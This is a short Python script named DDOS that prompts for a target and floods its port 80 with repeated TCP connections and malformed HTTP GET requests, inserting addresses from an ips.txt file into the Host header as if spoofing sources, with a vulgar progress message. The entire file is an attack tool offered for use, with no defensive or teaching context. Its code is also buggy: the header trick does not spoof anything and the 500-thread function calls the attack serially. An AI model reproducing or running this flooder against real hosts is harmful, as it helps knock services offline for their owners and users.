# Will Have Been Coded By: </Nader>
import random
import threading
import socket
import sys


class DDOS:
    def __init__(self, tgt: str, port=80):
        self.__tgt = tgt
        self.__port = port

    def attack(self):
        global s
        fakeIps = open('ips.txt', 'r').readlines()

        try:
            cntr = 0
            while 1:
                fIp = random.choice(fakeIps)
                fIp = fIp.strip()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.__tgt, self.__port))
                s.settimeout(2)
                s.send(f"GET /{self.__tgt} HTTP/1.1\r\n".encode('ascii'))
                s.sendto(f"HOST: /{fIp} \r\n\r\n".encode('ascii'), (self.__tgt, self.__port))
                print(f"fucking {self.__tgt}... {cntr}")
                cntr += 1
        except socket.error:
            print("error")

            s.close()

    def hardAttack(self, threads=500):
        for i in range(threads):
            thread = threading.Thread(target=self.attack())
            thread.start()


a = DDOS(input("Give me a target: "), 80)
a.attack()
a.hardAttack()

# Was Coded By: </Nader>
